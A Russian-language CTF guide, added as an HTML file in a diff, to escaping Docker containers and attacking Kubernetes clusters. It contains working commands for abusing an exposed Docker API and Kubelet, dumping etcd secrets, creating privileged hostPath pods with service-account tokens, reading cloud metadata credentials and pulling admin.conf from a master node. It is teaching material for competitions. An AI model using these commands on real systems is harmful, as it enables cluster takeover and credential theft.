@@ -1,0 +1,540 @@
+<article class="markdown-body entry-content container-lg" itemprop="text">
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Расширенный разбор Docker в CTF
+  </h3>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Механика контейнеризации и точки входа
+  </h4>
+ </div>
+ <p dir="auto">
+  Docker использует Linux-механизмы для изоляции:
+ </p>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Namespaces
+   </strong>
+   : Изолируют процессы (PID), сеть (NET), файловую систему (MNT).
+  </li>
+  <li>
+   <strong>
+    Cgroups
+   </strong>
+   : Ограничивают ресурсы (CPU, память).
+  </li>
+  <li>
+   <strong>
+    Capabilities
+   </strong>
+   : Определяют привилегии (например,
+   <code>
+    CAP_SYS_ADMIN
+   </code>
+   ).
+  </li>
+ </ul>
+ <p dir="auto">
+  В CTF часто встречаются задачи, где эти механизмы настроены некорректно, что позволяет "вырваться" из
+        контейнера.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h5 class="heading-element" dir="auto" tabindex="-1">
+   Пример: Выход за пределы контейнера через Capabilities
+  </h5>
+ </div>
+ <p dir="auto">
+  Если контейнер запущен с расширенными capabilities (например,
+  <code>
+   CAP_SYS_PTRACE
+  </code>
+  ), можно
+        вмешаться в процессы хоста:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>ls -l /proc/1/exe  <span class="pl-c"><span class="pl-c">#</span> Проверяем доступ к хост-процессам</span>
+    ptrace -p 1  <span class="pl-c"><span class="pl-c">#</span> Прицепляемся к init-процессу хоста</span></pre>
+ </div>
+ <p dir="auto">
+  Если
+  <code>
+   CAP_SYS_ADMIN
+  </code>
+  включен, попробуйте манипулировать ядром:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-c1">echo</span> 0 <span class="pl-k">&gt;</span> /proc/sys/kernel/yama/ptrace_scope  <span class="pl-c"><span class="pl-c">#</span> Отключаем защиту</span></pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h5 class="heading-element" dir="auto" tabindex="-1">
+   Docker Bench Security
+  </h5>
+ </div>
+ <p dir="auto">
+  В реальных системах используют инструменты вроде
+  <code>
+   docker-bench-security
+  </code>
+  для аудита. В CTF
+        вы можете сами проверить:
+ </p>
+ <ul dir="auto">
+  <li>
+   Есть ли
+   <code>
+    --pid=host
+   </code>
+   или
+   <code>
+    --network=host
+   </code>
+   ?
+  </li>
+  <li>
+   Монтируется ли
+   <code>
+    /
+   </code>
+   или
+   <code>
+    /etc
+   </code>
+   ?
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Эксплуатация через Dockerfile
+  </h4>
+ </div>
+ <p dir="auto">
+  Иногда в задаче дают доступ к
+  <code>
+   Dockerfile
+  </code>
+  . Ищите уязвимости:
+ </p>
+ <ul dir="auto">
+  <li>
+   <strong>
+    EXPOSE
+   </strong>
+   : Открытые порты могут указывать на сервисы.
+  </li>
+  <li>
+   <strong>
+    COPY
+   </strong>
+   : Файлы, скопированные в контейнер, могут содержать флаг.
+  </li>
+  <li>
+   <strong>
+    RUN
+   </strong>
+   : Команды могут оставлять следы (например,
+   <code>
+    echo FLAG &gt; /flag
+   </code>
+   ).
+  </li>
+ </ul>
+ <p dir="auto">
+  Пример:
+ </p>
+ <div class="highlight highlight-source-dockerfile notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">FROM</span> ubuntu
+    <span class="pl-k">RUN</span> echo <span class="pl-s">"CTF{docker_leak}"</span> &gt; /secret.txt
+    <span class="pl-k">CMD</span> [<span class="pl-s">"/bin/bash"</span>]</pre>
+ </div>
+ <p dir="auto">
+  Проверяйте:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>cat /secret.txt</pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Docker API exploitation
+  </h4>
+ </div>
+ <p dir="auto">
+  Если вы нашли доступ к Docker API (например, через порт 2375), можно управлять хостом:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>curl -X GET http://localhost:2375/containers/json  <span class="pl-c"><span class="pl-c">#</span> Список контейнеров</span>
+    curl -X POST http://localhost:2375/containers/create -d <span class="pl-s"><span class="pl-pds">'</span>{"Image": "alpine", "Cmd": ["cat", "/host/flag.txt"], "Binds": ["/:/host"]}<span class="pl-pds">'</span></span></pre>
+ </div>
+ <p dir="auto">
+  Запустите контейнер и получите результат.
+ </p>
+ <hr/>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Глубокий разбор Kubernetes в CTF
+  </h3>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Архитектура Kubernetes
+  </h4>
+ </div>
+ <p dir="auto">
+  Понимание компонентов K8s критично для CTF:
+ </p>
+ <ul dir="auto">
+  <li>
+   <strong>
+    API Server
+   </strong>
+   : Центральный узел управления (порт 6443 или 443).
+  </li>
+  <li>
+   <strong>
+    etcd
+   </strong>
+   : Хранилище конфигураций и Secrets (порт 2379).
+  </li>
+  <li>
+   <strong>
+    Kubelet
+   </strong>
+   : Агент на нодах (порт 10250).
+  </li>
+  <li>
+   <strong>
+    Pod
+   </strong>
+   : Минимальная единица, содержащая контейнеры.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Расширенные векторы атак
+  </h4>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h5 class="heading-element" dir="auto" tabindex="-1">
+   1. Атака через etcd
+  </h5>
+ </div>
+ <p dir="auto">
+  Если в задаче доступен порт 2379 (etcd), вы можете извлечь все данные кластера:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>etcdctl --endpoints=http://127.0.0.1:2379 get --prefix /registry</pre>
+ </div>
+ <p dir="auto">
+  Флаги часто хранятся в Secrets:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>etcdctl --endpoints=http://127.0.0.1:2379 get /registry/secrets/default/flag-secret</pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h5 class="heading-element" dir="auto" tabindex="-1">
+   2. Kubelet exploitation
+  </h5>
+ </div>
+ <p dir="auto">
+  Kubelet (порт 10250) иногда открыт без аутентификации. Проверяйте:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>curl -k https://<span class="pl-k">&lt;</span>node-ip<span class="pl-k">&gt;</span>:10250/pods</pre>
+ </div>
+ <p dir="auto">
+  Если доступ есть, создайте Pod или выполните команду в существующем:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>curl -X POST -k https://<span class="pl-k">&lt;</span>node-ip<span class="pl-k">&gt;</span>:10250/run/<span class="pl-k">&lt;</span>namespace<span class="pl-k">&gt;</span>/<span class="pl-k">&lt;</span>pod<span class="pl-k">&gt;</span>/<span class="pl-k">&lt;</span>container<span class="pl-k">&gt;</span> -d <span class="pl-s"><span class="pl-pds">"</span>cmd=cat+/flag.txt<span class="pl-pds">"</span></span></pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h5 class="heading-element" dir="auto" tabindex="-1">
+   3. Service Account Token Abuse
+  </h5>
+ </div>
+ <p dir="auto">
+  Токены сервисных аккаунтов — золотая жила в K8s-задачах. Они монтируются по умолчанию, если не
+        отключены (
+  <code>
+   automountServiceAccountToken: false
+  </code>
+  ). Используйте их для:
+ </p>
+ <ul dir="auto">
+  <li>
+   Перечисления ресурсов:
+   <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+    <pre>curl -k -H <span class="pl-s"><span class="pl-pds">"</span>Authorization: Bearer <span class="pl-smi">$TOKEN</span><span class="pl-pds">"</span></span> https://kubernetes.default.svc/api/v1/namespaces/default/pods</pre>
+   </div>
+  </li>
+  <li>
+   Создания привилегированного Pod’а:
+   <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+    <pre>cat <span class="pl-s"><span class="pl-k">&lt;&lt;</span><span class="pl-k">EOF</span> | curl -k -H "Authorization: Bearer <span class="pl-smi">$TOKEN</span>" -X POST https://kubernetes.default.svc/api/v1/namespaces/default/pods -d @-</span>
+    <span class="pl-s">{</span>
+    <span class="pl-s">  "apiVersion": "v1",</span>
+    <span class="pl-s">  "kind": "Pod",</span>
+    <span class="pl-s">  "metadata": {"name": "pwn"},</span>
+    <span class="pl-s">  "spec": {</span>
+    <span class="pl-s">    "containers": [</span>
+    <span class="pl-s">      {</span>
+    <span class="pl-s">        "name": "pwn",</span>
+    <span class="pl-s">        "image": "ubuntu",</span>
+    <span class="pl-s">        "command": ["bash", "-c", "cat /host/flag.txt"],</span>
+    <span class="pl-s">        "volumeMounts": [{"name": "host", "mountPath": "/host"}]</span>
+    <span class="pl-s">      }</span>
+    <span class="pl-s">    ],</span>
+    <span class="pl-s">    "volumes": [{"name": "host", "hostPath": {"path": "/"}}]</span>
+    <span class="pl-s">  }</span>
+    <span class="pl-s">}</span>
+    <span class="pl-s"><span class="pl-k">EOF</span></span></pre>
+   </div>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h5 class="heading-element" dir="auto" tabindex="-1">
+   4. Misconfigured Metadata API
+  </h5>
+ </div>
+ <p dir="auto">
+  В облачных провайдерах (AWS, GCP) Pod’ы могут обращаться к Metadata API. Например, в AWS:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</pre>
+ </div>
+ <p dir="auto">
+  Если роль IAM настроена неправильно, вы получите ключи для доступа к другим ресурсам.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h5 class="heading-element" dir="auto" tabindex="-1">
+   5. Sidecar-контейнеры
+  </h5>
+ </div>
+ <p dir="auto">
+  Иногда в Pod’е есть дополнительные контейнеры (sidecars). Проверяйте их:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>kubectl describe pod <span class="pl-k">&lt;</span>pod-name<span class="pl-k">&gt;</span></pre>
+ </div>
+ <p dir="auto">
+  Если один из них привилегирован, используйте его для атаки.
+ </p>
+ <hr/>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Инструменты для анализа K8s
+  </h4>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    kubectx/kubens
+   </strong>
+   : Быстрое переключение контекстов и namespace’ов.
+  </li>
+  <li>
+   <strong>
+    k9s
+   </strong>
+   : Терминал для управления кластером.
+  </li>
+  <li>
+   <strong>
+    Trivy
+   </strong>
+   : Сканер уязвимостей в контейнерах.
+  </li>
+  <li>
+   <strong>
+    Metasploit
+   </strong>
+   : Модули для Docker/K8s (например,
+   <code>
+    exploit/linux/http/docker_daemon_tcp
+   </code>
+   ).
+  </li>
+ </ul>
+ <hr/>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Сложные сценарии CTF
+  </h3>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Сценарий 1: Docker + K8s + Web
+  </h4>
+ </div>
+ <p dir="auto">
+  Вы подключаетесь к веб-приложению в контейнере:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>curl http://app.local</pre>
+ </div>
+ <p dir="auto">
+  Находите LFI (Local File Inclusion):
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>curl http://app.local/file<span class="pl-k">?</span>path=/proc/self/environ</pre>
+ </div>
+ <p dir="auto">
+  Из переменных окружения получаете токен K8s (
+  <code>
+   KUBERNETES_SERVICE_TOKEN
+  </code>
+  ). Используете его
+        для создания Pod’а и чтения
+  <code>
+   /flag.txt
+  </code>
+  на хосте.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Сценарий 2: CRI-O вместо Docker
+  </h4>
+ </div>
+ <p dir="auto">
+  Вместо Docker используется CRI-O (альтернативный контейнерный runtime). Проверяйте:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>crictl ps  <span class="pl-c"><span class="pl-c">#</span> Список контейнеров</span>
+    crictl <span class="pl-c1">exec</span> -it <span class="pl-k">&lt;</span>container-id<span class="pl-k">&gt;</span> /bin/sh</pre>
+ </div>
+ <p dir="auto">
+  Если CRI-O настроен с
+  <code>
+   --privileged
+  </code>
+  , выходите на хост через
+  <code>
+   /proc
+  </code>
+  .
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Сценарий 3: Taint/Toleration Abuse
+  </h4>
+ </div>
+ <p dir="auto">
+  В задаче вы видите, что мастер-нода доступна для запуска Pod’ов (нет taint’ов). Создайте Pod с
+  <code>
+   nodeName: master
+  </code>
+  :
+ </p>
+ <div class="highlight highlight-source-yaml notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-ent">spec</span>:
+      <span class="pl-ent">nodeName</span>: <span class="pl-s">master</span>
+      <span class="pl-ent">containers</span>:
+      - <span class="pl-ent">name</span>: <span class="pl-s">pwn</span>
+        <span class="pl-ent">image</span>: <span class="pl-s">alpine</span>
+        <span class="pl-ent">command</span>: <span class="pl-s">["cat", "/etc/kubernetes/admin.conf"]</span></pre>
+ </div>
+ <p dir="auto">
+  Извлеките конфиг и получите полный контроль.
+ </p>
+ <hr/>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Практические советы
+  </h3>
+ </div>
+ <ol dir="auto">
+  <li>
+   <strong>
+    Логи
+   </strong>
+   : Проверяйте
+   <code>
+    /var/log
+   </code>
+   в контейнере или Pod’е — там могут быть подсказки.
+  </li>
+  <li>
+   <strong>
+    Kernel exploits
+   </strong>
+   : Если версия ядра устарела (узнать через
+   <code>
+    uname -r
+   </code>
+   ), ищите
+            эксплойты (например, Dirty COW).
+  </li>
+  <li>
+   <strong>
+    Debugging
+   </strong>
+   : Используйте
+   <code>
+    strace
+   </code>
+   или
+   <code>
+    gdb
+   </code>
+   для анализа бинарников
+            внутри контейнера.
+  </li>
+ </ol>
+ <hr/>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Дополнительные ресурсы
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    HackTricks
+   </strong>
+   : hacktricks.xyz (разделы Docker/Kubernetes).
+  </li>
+  <li>
+   <strong>
+    PayloadsAllTheThings
+   </strong>
+   : github.com/swisskyrepo/PayloadsAllTheThings (K8s Exploits).
+  </li>
+  <li>
+   <strong>
+    CTFtime
+   </strong>
+   : Архив задач с облачными темами.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Задачи для практики
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Kubernetes Goat
+   </strong>
+   (github.com/madhuakula/kubernetes-goat)
+            Коллекция уязвимых K8s-сценариев с пошаговыми решениями.
+  </li>
+  <li>
+   <strong>
+    TryHackMe
+   </strong>
+   (tryhackme.com)
+   <br/>
+   Комнаты: "Kubernetes Basics", "Docker Security".
+  </li>
+  <li>
+   <strong>
+    CTFtime
+   </strong>
+   (ctftime.org)
+   <br/>
+   Архив задач с прошедших соревнований (фильтр по "cloud" или "container").
+  </li>
+ </ul>
+</article>
